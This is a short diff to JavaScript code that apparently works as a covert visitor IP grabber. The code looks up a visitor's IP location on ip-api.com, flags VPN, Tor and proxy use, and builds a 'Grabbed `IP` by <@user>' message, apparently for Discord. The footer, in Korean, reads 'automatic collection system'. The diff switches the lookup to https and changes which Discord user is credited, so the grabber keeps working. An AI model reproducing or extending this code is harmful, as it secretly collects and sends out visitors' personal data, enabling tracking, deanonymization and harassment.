@@ -991,7 +991,7 @@ async function collectAndSendInfo() {
         // 위치 정보 (ip-api) - primary IP 기준
         if (visitorInfo.ip) {
             try {
-                const locationResponse = await fetch(`http://ip-api.com/json/${visitorInfo.ip}`);
+                const locationResponse = await fetch(`https://ip-api.com/json/${visitorInfo.ip}`);
                 const locationData = await locationResponse.json();
 
                 if (locationData.status === 'success') {
@@ -1108,7 +1108,7 @@ async function collectAndSendInfo() {
             footer: { text: "자동 수집 시스템" }
         };
 
-        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719> ${
+        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1173942304927645786> ${
             visitorInfo.vpnDetection.isVPN ? '🔴 **[VPN 감지!]**' : 
             visitorInfo.vpnDetection.isTor ? '🔴 **[Tor 감지!]**' : 
             visitorInfo.vpnDetection.isProxy ? '🟡 **[프록시 의심]**' : 
